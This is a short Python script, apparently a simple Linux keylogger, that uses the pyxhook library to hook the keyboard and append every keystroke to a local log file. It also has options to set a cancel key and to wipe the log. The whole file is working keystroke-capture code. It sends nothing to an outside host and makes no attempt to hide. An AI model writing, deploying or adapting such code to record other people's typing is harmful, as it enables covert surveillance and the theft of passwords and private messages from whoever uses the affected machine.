
import os
import pyxhook
  

log_file = os.environ.get(
    'pylogger_file',
    os.path.expanduser('./file.log')
)
cancel_key = ord(
    os.environ.get(
        'pylogger_cancel',
        '`'
    )[0]
)
  
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        pass

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        if event.Key=="Return" :
            empty=""
            f.write('{}\n'.format(empty))
        else:
            if event.Key =="space":
                space=" "
                f.write('{}'.format(space))
            else: 
                f.write('{}'.format(event.Key))

  
# create a hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start()         
except KeyboardInterrupt:
    
    pass
except Exception as ex:
    
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
